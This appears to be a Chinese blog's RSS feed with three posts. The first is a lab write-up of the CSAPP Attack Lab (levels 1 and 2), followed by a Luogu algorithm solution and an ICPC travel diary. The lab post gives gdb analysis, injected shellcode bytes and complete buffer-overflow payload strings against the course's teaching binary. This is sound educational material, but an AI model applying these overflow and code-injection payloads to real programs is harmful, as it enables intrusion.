<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>博文 on codgician</title>
		<link>https://codgician.me/zh-hans/posts/</link>
		<description>Recent content in 博文 on codgician</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-hans</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.</copyright>
		<lastBuildDate>Sun, 10 May 2020 16:29:10 +0800</lastBuildDate>
		<atom:link href="https://codgician.me/zh-hans/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>CSAPP: Attack Lab</title>
			<link>https://codgician.me/zh-hans/posts/2020/05/csapp-attack-lab/</link>
			<pubDate>Sun, 10 May 2020 16:29:10 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2020/05/csapp-attack-lab/</guid>
			<description>实验内容 本实验是 CSAPP:3e 一书的配套实验之一，相关资料如下： 实验文件 实验要求 在本次实验中，我们将试着对给定的可在 Linux 下运行的二进制文件进行缓冲区溢出攻</description>
			<content type="html"><![CDATA[<h1 id="实验内容">实验内容</h1>
<p>本实验是 CSAPP:3e 一书的配套实验之一，相关资料如下：</p>
<ul>
<li><a href="http://csapp.cs.cmu.edu/3e/target1.tar">实验文件</a></li>
<li><a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">实验要求</a></li>
</ul>
<p>在本次实验中，我们将试着对给定的可在 Linux 下运行的二进制文件进行缓冲区溢出攻击。实验一共分为五个部分，每一个部分的具体要求都会在后文中详述。</p>
<p>本文随自己的实验进度缓慢更新……<del>（咕咕）</del></p>
<h1 id="知识回顾">知识回顾</h1>
<p><strong>对于 x86 平台，程序运行时调用函数的过程是怎样的？</strong></p>
<p>为了能够实现函数递归，函数调用的相关信息都是在 <em>栈 (stack)</em> 中进行维护的。在 x86 汇编中，寄存器 <code>%rsp</code> 指向栈顶位置，寄存器 <code>%rbp</code> 指向栈起始的位置，同时栈是从高地址向低地址生长的。当调用函数时，大致需要依次进行如下步骤：</p>
<ul>
<li>将参数按照从右至左顺序压入栈中；</li>
<li>将返回地址压入栈中；</li>
<li>将旧的 <code>%rbp</code> 值压入栈中，并将 <code>%rbp</code> 的值更新为 <code>%rsp</code>。换言之，这一步即为被调用的函数更新栈的起始位置；</li>
<li>接下来便可以执行被调用的函数了；</li>
<li>执行完后，将旧 <code>%rbp</code> 值从栈中弹出，并恢复 <code>%rbp</code> 的值（因为现在回到之前的函数了）；</li>
<li>执行 <code>ret</code> 指令，跳转到返回地址（这一过程中会将栈中的参数以及返回地址弹出）。</li>
</ul>
<p>可见，如果被执行的函数中调用了 <code>gets()</code> 函数（即允许用户输入字符串）同时没有增加任何额外安全措施，我们可以通过精心构造字符串，使得该字符串长度超出缓冲区大小，以达到对栈中其他位置的信息进行覆盖的目的。例如，我们可以通过覆盖返回地址字段，使得该函数被执行完后返回到其他的位置。更进一步，甚至可能注入自己构造的恶意代码来达到各种恶意的目的。接下来的实验就会更具体地说明这一点。</p>
<h1 id="实验">实验</h1>
<h2 id="level-1">Level 1</h2>
<h3 id="要求">要求</h3>
<p>在 Level 1 中，暂且不要求注入自己构造的代码，而是构造一个字符串，使得程序执行另一处已有的代码。</p>
<p>在二进制可执行文件 <code>ctarget</code> 中，<code>getbuf()</code> 函数则是一个存在漏洞的获取用户输入的函数。其源代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="nf">getbuf</span><span class="p">()</span> 
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
    <span class="n">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>其中 <code>Gets()</code> 与标准库中的 <code>gets()</code> 类似，它会一直读入字符串知道遇到结束符为止，而不会对缓冲区大小是否溢出进行任何检查。<code>getbuf()</code> 函数在 <code>test()</code> 函数中被调用，其源代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">test</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
    <span class="n">val</span> <span class="o">=</span> <span class="n">getbuf</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;No exploit. Getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p><code>getbuf()</code> 在执行完成后会返回到 <code>test()</code> 继续向后执行。我们的目的是让 <code>getbuf()</code> 执行完后跳转到程序 <code>touch1()</code> 函数处进行执行。<code>touch1()</code> 的源代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">touch1</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Touch1!: You called touch1()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>由于本菜鸡不是 CMU 的学生，因此自然也没发连接到 CMU 记录分数的服务器。因此在运行 <code>ctarget</code> 时需要加上参数 <code>-q</code> 以避免前述服务器进行连接。另外，由于构造出的字符串很可能包含非法的 ASCII 字符，为了方便大家，<code>ctarget</code> 支持二进制文件中读取信息。同时，作者也很贴心地提供了小工具 <code>hex2raw</code> 以帮助大家把构造好的 16进制 字符串转换为二进制文件。我们首先要将我们构造好的字符串逐字节一个文本文件（如 <code>hex.txt</code>），每一个字节均使用两位16进制表示，并且字符之间用空格隔开。如：</p>
<pre><code>0a 2d 3f ...
</code></pre><p>便可以生成对应二进制文件：</p>
<pre><code>$ hex2raw &lt; hex.txt &gt; raw
</code></pre><p>最后再将其传给 <code>ctarget</code>：</p>
<pre><code>$ ctarget -q -i raw
</code></pre><h3 id="过程">过程</h3>
<p>先运行一下 <code>./ctarget</code> 看看它长啥样：</p>
<pre><code>$ ./ctarget -q
Cookie: 0x59b997fa
Type string:Hello World!
No exploit.  Getbuf returned 0x1
Normal return
</code></pre><p>整个程序会要求我们输入一个字符串并显示一些结果。在这里我首先输入了 <code>Hello, World!</code>。显然这个字符串是不足以让程序出现问题的，因此其提示 <code>No exploit</code>。而我们的目的是执行函数 <code>touch1()</code>，故若成功其提示应当包含 <code>Touch1!: You called touch1()</code>。</p>
<p>首先来看看 <code>getbuf()</code> 的汇编代码：</p>
<pre><code>$ gdb --args ./ctarget -q

(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 &lt;+0&gt;:   sub    $0x28,%rsp
   0x00000000004017ac &lt;+4&gt;:   mov    %rsp,%rdi
   0x00000000004017af &lt;+7&gt;:   callq  0x401a40 &lt;Gets&gt;
   0x00000000004017b4 &lt;+12&gt;:  mov    $0x1,%eax
   0x00000000004017b9 &lt;+17&gt;:  add    $0x28,%rsp
   0x00000000004017bd &lt;+21&gt;:  retq   
End of assembler dump.
</code></pre><p>第一条指令表明栈顶 <code>%rsp</code> 向下生长了 <code>0x28</code>（即 40）个字节，故得知 <code>BUFFER_SIZE</code> 值为 40。输入的字符是从低地址向高地址存储的，恰好函数的返回地址也在高地址里，这为修改函数返回地址提供了可能。不妨在 <code>getbuf()</code> 处（即 <code>*0x4017a8</code> 处）打上断点，此时栈顶应当指向返回地址：</p>
<pre><code>(gdb) b getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

(gdb) r
Starting program: /home/codgician/GitHub/explorations/CSAPP/attack-lab/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12

(gdb) x $rsp
0x5561dca0:	0x00401976

(gdb) x 0x00401976
0x401976 &lt;test+14&gt;:	0x88bec289
</code></pre><p>可见栈顶 <code>0x5561dca0</code> 中的值为 <code>0x00401976</code>。而该地址恰好指向 <code>test()</code> 中调用 <code>getbuf()</code> 之后的位置，故可确定这就是我们想要修改的返回地址。来查询一下 <code>touch1()</code> 的地址：</p>
<pre><code>(gdb) info address touch1
Symbol &quot;touch1&quot; is a function at address 0x4017c0.
</code></pre><p>需要注意的是，由于 x86 采取 <em>小端 (Little Endian)</em> 字节顺序，若希望栈中出现 <code>0x004017c0</code>，则我们构造的输入应当为 <code>c0 17 40 00</code>。基于上述分析，我们构造的字符串只需要首先包含 40 个任意字符，接下來再包含目标地址即可。<code>hex.txt</code> 内容如下：</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00
</code></pre><p>使用 <code>hex2raw</code> 将其转换为二进制文件后传入 <code>ctarget</code>，便可以达成目的：</p>
<pre><code>$ ./hex2raw &lt; hex.txt &gt; raw &amp;&amp; ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
  user id	bovik
  course	15213-f15
  lab	attacklab
  result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 
</code></pre><h2 id="level-2">Level 2</h2>
<h3 id="要求-1">要求</h3>
<p>在 Level 2 中，要求执行的函数变为 <code>touch2()</code>。与上一关不同的是，<code>touch2()</code> 函数带有一个参数。其源代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
        <span class="n">validate</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
        <span class="n">fail</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p><code>cookie</code> 值即之前运行时提示的 <code>0x59b997fa</code>。</p>
<h3 id="过程-1">过程</h3>
<p>刚开始的时候本菜鸡准备投机取巧：直接跳转到 <code>if (val == cookie)</code> 后的语句之处。不过可惜作者早就考虑到了，<code>validate</code> 函数中应该还会对 <code>val</code> 进行进一步检查，所以就凉了。</p>
<p>复杂一点的思路，便是我们要在构造的字符串中包含调用 <code>touch2()</code> 的汇编代码，同时让程序跳转到我们注入的代码处执行。因此我们先来看看 <code>touch2()</code> 的汇编代码：</p>
<pre><code>(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec &lt;+0&gt;:	  sub    $0x8,%rsp
   0x00000000004017f0 &lt;+4&gt;:	  mov    %edi,%edx
   0x00000000004017f2 &lt;+6&gt;:   movl   $0x2,0x202ce0(%rip)    # 0x6044dc &lt;vlevel&gt;
   0x00000000004017fc &lt;+16&gt;:  cmp    0x202ce2(%rip),%edi    # 0x6044e4 &lt;cookie&gt;
   0x0000000000401802 &lt;+22&gt;:  jne    0x401824 &lt;touch2+56&gt;
   0x0000000000401804 &lt;+24&gt;:  mov    $0x4030e8,%esi
   0x0000000000401809 &lt;+29&gt;:  mov    $0x1,%edi
   0x000000000040180e &lt;+34&gt;:  mov    $0x0,%eax
   0x0000000000401813 &lt;+39&gt;:  callq  0x400df0 &lt;__printf_chk@plt&gt;
   0x0000000000401818 &lt;+44&gt;:  mov    $0x2,%edi
   0x000000000040181d &lt;+49&gt;:  callq  0x401c8d &lt;validate&gt;
   0x0000000000401822 &lt;+54&gt;:  jmp    0x401842 &lt;touch2+86&gt;
   0x0000000000401824 &lt;+56&gt;:  mov    $0x403110,%esi
   0x0000000000401829 &lt;+61&gt;:  mov    $0x1,%edi
   0x000000000040182e &lt;+66&gt;:  mov    $0x0,%eax
   0x0000000000401833 &lt;+71&gt;:  callq  0x400df0 &lt;__printf_chk@plt&gt;
   0x0000000000401838 &lt;+76&gt;:  mov    $0x2,%edi
   0x000000000040183d &lt;+81&gt;:  callq  0x401d4f &lt;fail&gt;
   0x0000000000401842 &lt;+86&gt;:  mov    $0x0,%edi
   0x0000000000401847 &lt;+91&gt;:  callq  0x400e40 &lt;exit@plt&gt;
End of assembler dump.
</code></pre><p>可见，<code>touch2()</code> 传入的参数 <code>val</code> 被存放在寄存器 <code>%edi</code> 中，并且在 <code>&lt;+16&gt;</code> 处与 <code>cookie</code> 进行比较。因此，在进入 <code>touch2()</code> 前我们要将寄存器 <code>%edi</code> 中的值修改掉，即如下汇编代码：</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span> <span class="no">$0x59b997fa</span><span class="p">,</span> <span class="nv">%edi</span>
</code></pre></div><p>除此之外，需要将程序跳转至 <code>touch2()</code> 处（地址为 `0x004017ec）。故：</p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span> <span class="no">$0x004017ec</span><span class="p">,</span> <span class="nv">%eax</span>
<span class="nf">jmp</span> <span class="p">*</span><span class="nv">%eax</span>
</code></pre></div><p>将上述代码汇编后，得到：</p>
<pre><code>BF FA 97 B9 59 B8 EC 17 40 00 FF E0
</code></pre><p>最后，我们借助与 Level 1 类似的思路，让 <code>getbuf()</code> 执行完成后跳转到我们刚刚注入的代码，也就是字符串的起始位置 <code>0x5561dc78</code>（即 Level 1 中所提到的返回地址的位置减去 <code>0x28</code>）。最终构造出如下字符串：</p>
<pre><code>BF FA 97 B9 59 B8 EC 17 40 00 FF E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
</code></pre><p>试试看～</p>
<pre><code>$ ./hex2raw &lt; hex.txt &gt; raw &amp;&amp; ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 B8 EC 17 40 00 FF E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
</code></pre><h2 id="level-3">Level 3</h2>
<h3 id="要求-2">要求</h3>
]]></content>
		</item>
		
		<item>
			<title>Luogu P3943: 星空</title>
			<link>https://codgician.me/zh-hans/posts/2019/02/luogu-p3943/</link>
			<pubDate>Tue, 05 Feb 2019 11:20:57 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2019/02/luogu-p3943/</guid>
			<description>题面 现有一个长度为 $n$ 的灯泡序列，其中 $k$ 个位置上的灯泡是熄灭的，其余的是点亮的。我们可以进行 $m$ 种操作，而第 $i$ 种操作是选定任意长度为 $b_i$ 的连续灯泡</description>
			<content type="html"><![CDATA[<h1 id="题面">题面</h1>
<p>现有一个长度为 $n$ 的灯泡序列，其中 $k$ 个位置上的灯泡是熄灭的，其余的是点亮的。我们可以进行 $m$ 种操作，而第 $i$ 种操作是选定任意长度为 $b_i$ 的连续灯泡区间，对这个区间内所有灯泡的状态都进行一次翻转（亮变灭，灭变亮）。试求最少需要几次操作就可以让所有灯泡都被点亮。</p>
<p><strong>数据范围</strong>：$1 \le n, b_i \le 4 \times 10^4, \ 1 \le m \le 64, \ 1 \le k \le 8$</p>
<p><strong>题目链接</strong>：<a href="https://www.luogu.com.cn/problemnew/show/P3943">Luogu P3943: 星空</a></p>
<h1 id="分析">分析</h1>
<h2 id="差分思想">差分思想</h2>
<p>首先一个非常优雅的想法就是利用差分将区间操作变换为单点操作。不过这里我们面对的是一个 $01$ 序列，我们可以把普通的前缀和改成异或前缀和。严格地说，记 $a$ 代表原 $01$ 序列，$d$ 是原序列的异或差分数组。那么它们之间存在如下关系：</p>
<p>$$
a_i = b_0 \oplus b_1 \oplus \dots \oplus b_i
$$</p>
<p>这样翻转 $a$ 中的 $[l, r]$ 区间就等价于在 $b$ 中翻转 $l$ 和 $r + 1$ 两个位置，于是 $a$ 中的区间操作就转换为了 $d$ 中的单点操作（注意 $d$ 的长度是 $n + 1$）。</p>
<p>由此原问题被转换为这样一个新问题：给定一个 $01$ 序列 $d$，一次只能选择两个位置上的值（这两个位置间隔的距离是题面给出的 $m$ 种）并对其进行翻转，试问最少翻转多少次可以将序列翻转成目标序列？</p>
<hr>
<p>我们不妨记灯亮为 $0$，灯暗为 $1$。这样的方便之处在于所有灯全亮时 $a$ 为全 $0$，而其对应的 $d$ 前 $n$ 个位置也为全 $0$。至于 $d$ 中的第 $n + 1$ 个位置，不论其为 $0$ 还是 $1$ 都不会对 $a$ 产生任何影响，因此第 $n + 1$ 位可以是任意值。</p>
<p>需要注意的是，题目给出了 $a$ 中 $1$ 的个数 $k \le 8$，这一限制对应到差分数组 $d$ 中会是怎样呢？如果我们要让 $d$ 为 $111111\dots$，那么 $a$ 的形式即如 $101010\dots$。不难发现若 $a$ 中最多有 $k$ 个 $1$，则 $d$ 中最多有 $2k$ 个 $1$。</p>
<h2 id="完全背包">完全背包</h2>
<p>我们继续考虑转换后的问题。为了最小化反转次数我们显然不会选择两个 $0$ 进行翻转，因为这样只会使得 $1$ 的个数增多。那么我们可以选择：</p>
<ul>
<li>选中两个 $1$，那么翻转后两个位置上的值都会变为 $0$；</li>
<li>选择一个 $0$ 和一个 $1$，那么这次操作后 $1$ 的个数并不会变化，其效果等效于将选中的两个位置上的值交换位置。进一步说，如果记两个位置间的距离为 $\Delta{x}$，则我们可以认为是 $1$ 向左或是向右移动了 $\Delta{x}$。</li>
</ul>
<p>那么问题进一步转换为：给定一个 $01$ 序列，对于序列中每个 $1$，每一步可以向前或向后走 $k$ 种距离，如果走到的位置上也是 $1$ 则两者相消为 $0$，问最少需要多少步可以使得所有位置都变为 $0$？</p>
<hr>
<p>考虑某一对 $1$ 之间的距离为 $\Delta{x}$，若要将这对 $1$ 相消，就需要左右两端的 $1$ 分别向左和向右移动到同一位置上。我们不妨把 $\Delta{x}$ 看作背包容量，每种可能的步数看作背包里的物品（每种步数 $v$ 要拆成 $+v$ 和 $-v$ 两个物品，因为既可以往左走又可以往右走），那么我们 $\mathcal{O}(nm)$ 跑一个完全背包就可以得到消去每一对 $1$ 所需要的最小步数。</p>
<h2 id="一般图的最大匹配">一般图的最大匹配</h2>
<p>在得到了消去每一对 $1$ 所需要的最小步数后 $w$，我们可以考虑在这两个点间建立一条价值为 $w$ 的无向边。这样一来，问题就转变为了一般图的最大匹配问题…… 大佬们可以使用带花树算法用 $\mathcal{O}(k^3)$ 级别复杂度解决之…… 当然这道题数据范围很小，所以我们也可以使用状压 DP 来解决。</p>
<p>最后还有一个细节，前面说了 $d$ 中第 $n + 1$ 位可以是任意值，因此如果考虑这一位会带来一些不便。我们可以这样处理：如果位置 $i$ 经过若干步可以到达第 $n + 1$ 位，我们就从 $i$ 向自己连一条边。其意义为 $i$ 可以与自己进行匹配。这样子就可以完全去掉第 $n + 1$ 位从而简化模型。</p>
<p>为了减小状态数量，我们不妨只考虑所有 $1$ 点。这样一来，初始状态用二进制表示就是 $11\dots1$，而目标状态即为 $00\dots0$。另外一个常见的优化是，我们不必用 $\mathcal{O}(k^2)$ 的复杂度去枚举每一个点对（那样会造成大量重复运算）。我们可以每次选取最左的 $1$ 点作为点对的一个点，然后 $\mathcal{O}(k)$ 枚举另一个点直接进行转移即可。这样子其实是可以遍历到所有状态的（反正目标状态中这个 $1$ 迟早要消去，这样转移的意义就是按顺序依次消去 $1$）。因此状压 DP 的复杂度为 $\mathcal{O}(k \cdot 2^k)$。</p>
<p>如果最后一部分采用状压 DP 实现，那么总的复杂度为 $\mathcal{O}(nm + k \cdot 2^k)$。如果能用带花树大概可以有 $\mathcal{O}(nm + k^3)$ 的复杂度，可惜我不会。最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P3943/dp_state_compression.cpp">我的代码</a> 以供参考。</p>
<h1 id="heading">%%%</h1>
<ul>
<li>fstqwq 杨爷太强了 %%%</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>ICPC 2018 亚洲区域赛北京站游记</title>
			<link>https://codgician.me/zh-hans/posts/2018/11/icpc-2018-asia-beijing-regional-travel-notes/</link>
			<pubDate>Mon, 26 Nov 2018 22:58:00 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/11/icpc-2018-asia-beijing-regional-travel-notes/</guid>
			<description>Day 0 早早地到达了高铁站…… 北京之行时长竟然有 $4$ 天，真是令人感到舒适…… 前面几天一直在瞎搞各种线段树，包括什么势能线段树 (aka 吉司机线段树)、多 tag</description>
			<content type="html"><![CDATA[<h1 id="day-0">Day 0</h1>
<p>早早地到达了高铁站…… 北京之行时长竟然有 $4$ 天，真是令人感到舒适……</p>
<p>前面几天一直在瞎搞各种线段树，包括什么势能线段树 (aka 吉司机线段树)、多 tag 线段树…… 于是在高铁上首先试着补了一补之前一直欠着没来得及做的多 tag 线段树的题…… 狂 WA…… 遂放弃。</p>
<p>一路经过了南京、徐州，最后终于到达了北京（滑稽）。到达北京后坐了四十分钟地铁终于到达了 PKU 附近。看到宾馆的大门我不禁联想到了湘潭之旅，但是进房间里后感觉房间里面还挺精致的。北京的宾馆真的好贵好贵 QAQ。</p>
<p>秋天的银杏很美……</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/first_glimpse.jpg" alt="初见北大"></p>
<p>放好东西后前往 PKU 签到，路上路过了庆丰包子铺（滑稽）。宾馆离比赛场地挺近的，签到时还顺便附赠了带有 PKU 和 ICPC 的北大红三口数据线，体验极佳！另外衣服也挺好看的 QwQ，就是白色不耐脏 QAQ。</p>
<p>晚上本来只是想问问高中同学 Harry 农园食堂和艺园食堂哪里好吃一点…… 没想到他超级热情像第二天请我吃饭。瞬间感到不好意思。Harry 推荐了农园二楼，然而北大发的饭卡不能在农园二楼用只能在农园一楼用。我费尽心机尽量凑够了 $20$ 元，结账时却被告知超额了…… 有手续费？卡里面实际只有 $16.1$ 软妹币？这是什么操作 orz。后来才听说貌似是北大内部有人去贩卖多余的饭卡被发现了所以给大家都降额了…… 也是醉了。</p>
<p>吃完晚饭后一行人 “夜袭北大”。我顺便试了试 Google Camera 新的 Night Sight 的拍照效果（然而我并买不起 Pixel 所以只好用 port 过来的 Google Camera&hellip; QAQ)：</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/lake_and_tower.jpg" alt="一湖一塔"></p>
<p>拍摄了著名的的 “一湖一塔”。Google Camera 的 Night Shift 还是需要长时间曝光，而我又比较手抖，所以远看挺不错细看全是糊 QAQ。</p>
<p>回到宾馆后继续瞎搞了一番那道多 tag 线段树的题…… 果然又是 <code>pushDown</code> 写挂了。瞎改了一个不起眼的地方竟然就 A 了。Hanano 研究了一下饭卡后表示每张饭卡上的雕花都不一样（一共有 $64$ 个孔位），很可能饭卡就是一张普通的纸，然后读取饭卡的机器里面就是一个光源，通过开孔的排列来得到卡的序列号，而实际金额数据实际上都是被存储在远端服务器上的。听罢我顺觉很有道理，dalao 太强了orz，也不禁赞叹这一使得饭卡富有艺术感同时又能极大节约成本并方便管理的设计。所以是不是我在拿大头针再多扎几个孔就又是一条好汉了？（逃</p>
<p>最后貌似睡得并不早…… 但还好睡得还算好。</p>
<h1 id="day-1">Day 1</h1>
<p>上午一个人溜到北大去跟 Harry 巨佬溜达去了。Harry 带我逛了北大校园，又一次感到这才是大学，然后感觉自己读了个假大学（常规操作）。另外北大校史馆的牌子竟然是长者题字，$+1s$。中午和 Harry 一起吃了农园二楼的麻辣香锅，十分好吃。虽然比不上四川的冒菜或是干锅，但是我在杭州根本没找到如此具有家乡风格的菜 QAQ。再次感谢 Harry 巨佬orz。另外从 Harry 那里听说了北大图灵班的巨佬事迹，瑟瑟发抖。真希望自己有朝一日也能去波士顿看白鸽。</p>
<p>附上一张 PKU 校门图~</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/pku.jpg" alt="PKU 校门"></p>
<p>吃完饭后直接去体育馆等队友。一直在外面等的我没想到队友早就进看台了。一进看台没找到队友，而队友疯狂使用坐标定位法告诉我他们的坐标，然而本垃圾连 $x, y$ 轴是什么都不知道…… 最后还是使用 Hanano 巨佬教授的 cen 神定位法找到了队友 orz。</p>
<p>北大的体育馆好大好热…… 看 ACM 养老群里说竟然还有地热…… 这很北大。</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/khoo_teck_puat_gymnasium.jpg" alt="比赛场地"></p>
<p>北大发的气球竟然是那种可以飘起来的气球~ 里面充的大概是氦气和空气的混合气体？</p>
<p>热身赛听说是把近几年来北京区域赛的签到题混在了一起…… 然而本蒟蒻一场都没做过…… QAQ。后面的队伍早早 AK，都开始愉快地聊天划水了，而我们却还在各种卡题。我们很快就全部四道题的思路全部口胡出来了。Hanano 开了 A 题然而交了后 TLE 了…… 本垃圾开了 B 题 —— 一道一看就很傻逼的模拟题，然而随便一写一发入魂 TLE。什么？$1000$ 的数据范围 $\mathcal{O}(n\log{n})$ 还可以 TLE 的？调了半天还是 TLE，于是便打印了代码。在研究打印出来代码后发现有一处弹出优先队列的时候没有判空…… 但转念一想这应该 RE 而不是 TLE，一度怀疑算法错了。等到最后 nbfynbfy 大佬把 C 题成功 AC 掉避免集体爆零后，我不抱希望地把 B 题没判空的地方判了，交上去竟然 Accepted 了？黑人问号.jpg。拿小本本记下 hihoCoder 非法操作 STL 不会 RE 而会 TLE&hellip; QAQ （这貌似预示了第二天本垃圾会狂演队友？）</p>
<p>Hanano 的 A 题还在超时，我一看数据不大就建议 Hanano 本地打表并且交表。表倒是打出来了…… 不过交上去后代码死于 Waiting&hellip; 大概是裁判一看我们好菜签到题竟然都打表就把我们的代码 Skip 掉了 QAQ。最后我终于注意到数据组数 $T$ 恰好跟数据范围大小一致，立马意识到后台数据肯定就是把所有的值都询问了一遍…… 我立马意识到不应该正着搜索，而应该从最终状态开始倒着搜索与处理出所有的答案记录下来然后 $\mathcal{O}(1)$ 解决询问…… 然而时间不够了，放弃。</p>
<p>最后抱着两个气球回宾馆了。任凭一只绿油油的气球独自在天花板上开心玩耍：</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/the_balloon_flies.jpg" alt="天花板上的气球"></p>
<h1 id="day-2">Day 2</h1>
<p>一大早起来发现昨天还好好待在天花板上的气球失去了梦想……</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/the_balloon_loses_hope.jpg" alt="失去梦想的气球"></p>
<p>看起来今天多半是要自闭……</p>
<p>比赛开始前 Hanano 看志愿者打气球，发现 F 题气球很多的，就说可能是签到题（一口好奶）。于是开场后我先看 F 题。nbfynbfy 巨佬很快解决了 A 题并且 1A %%%。而与此同时，研究线段树走火入魔的我却无可救药地被 F 题吸引了（后来事实证明这是全场最难的题之一）。我疯狂往势能减小线段树方向去考虑…… 但发现对于区间异或操作我很难准确维护区间最大值和区间最小值…… 最后不得已放弃。我去看了看 B 题…… 什么这么大一道傻逼模拟题竟然没什么人过？我要上！然后很快写完后…… Wrong Answer。有点自闭，因为知道过的人很少我还专门自己造了几组样例测试了一下都没有问题。然后发现了一个小问题…… 改了改…… 又一发 Wrong Answer。我仔细阅读了一下题突然感觉题目可能有些歧义？于是就在 Clarification 里面问了一下，结果得到了一个 No Response。心态大崩，又是决定试一试另外一种理解，又 WA 了两发。在此期间 Hanano 和 nbfynbfy 大佬在疯狂讨论 D 题，几乎已经出解了。于是我只好打印代码并且把机位让给了他们。心态有点崩。</p>
<p>我仔细分析后认为我刚开始理解的提题意应该是正确的。于是在 nbfynbfy 成功 A 掉 D 题后我又腆着脸上去了…… 自己测了几组样例后偶然意识到处理前导 $0$ 的时候搞忘判 $0$ 了…… 头脑一热交一发，仍然 Wrong Answer。 心态巨崩，一度不敢交题。在本地自己造了很多组样例后终于发现了一个涉及换行的大问题…… 然而在此期间另外两位巨佬 I 题也搞出来了，于是我打印了我的代码并且让他们先上机。他们很快就把 I 题 A 掉了（被队友带飞 QAQ）。在他们写 I 题的时候我在纸上重构了我 B 题的代码并且在他们下机后立马重写了 B 题的代码，测了很多样例没问题后忐忑地交上去…… 终于 Accepted 了。长吁一口气，发现 Ranklist 我们队 B 题地下华丽丽地出现了 +7。对不起队友，捂脸 QAQ。</p>
<p>此时竟然离封榜就已经只剩不到半小时了。看榜的时候发现我们竟然在银牌区！于是我们决定最后一小时合力攻 H 题。我们很快确定了这是一道 DP，但是很遗憾的是我们直到最后也没有能够搞出来 QAQ。</p>
